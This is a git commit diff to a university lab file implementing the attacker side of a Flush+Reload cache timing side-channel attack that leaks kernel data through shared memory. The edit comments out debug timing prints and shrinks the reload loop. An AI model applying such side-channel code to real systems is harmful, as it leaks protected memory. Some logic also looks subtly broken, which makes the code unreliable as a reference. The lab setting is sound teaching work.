f50cca58fb0284f51698142f11f2f01dac2e1116
ykhodke <91660086+ykhodke@users.noreply.github.com>
2022-10-27 15:33:05 -0700

    Update attacker-part1.c

--- LAB2/part1-src/attacker-part1.c
+++ LAB2/part1-src/attacker-part1.c
@@ -58,21 +58,21 @@ int run_attacker(int kernel_fd, char *shared_memory) {
         //Flushing the memory here
         for (flush_offset = 0; flush_offset < 10; flush_offset++) {
             load_shared_mem = (char)(shared_memory+flush_offset);
-            dram_latency_bf = time_access((void*)(shared_memory+flush_offset));
+            //dram_latency_bf = time_access((void*)(shared_memory+flush_offset));
             clflush((void*)(shared_memory+flush_offset));
-            dram_latency = time_access((void*)(shared_memory+flush_offset));
-            printf("\n This is the latency before flush %li and after flush %li", dram_latency_bf,dram_latency);
+            //dram_latency = time_access((void*)(shared_memory+flush_offset));
+            //printf("\n This is the latency before flush %li and after flush %li", dram_latency_bf,dram_latency);
         }
 
         //Use call kernel to access data
         call_kernel_part1(kernel_fd, shared_memory, current_offset);
 
         //Reload and measure time and Decode the transmission to get data
-        for (flush_offset = 0; flush_offset < LAB2_SHARED_MEMORY_SIZE ; flush_offset++) {
+        for (flush_offset = 0; flush_offset < 10 ; flush_offset++) {
             dram_latency = time_access((void*)(shared_memory+flush_offset));
+            printf("\n This is the char we leaked %li", dram_latency);
             if (dram_latency > 100){
                 leaked_byte = (char)(flush_offset / LAB2_PAGE_SIZE);
-                printf("\n This is the char we leaked %li", dram_latency);
             }
         }
 
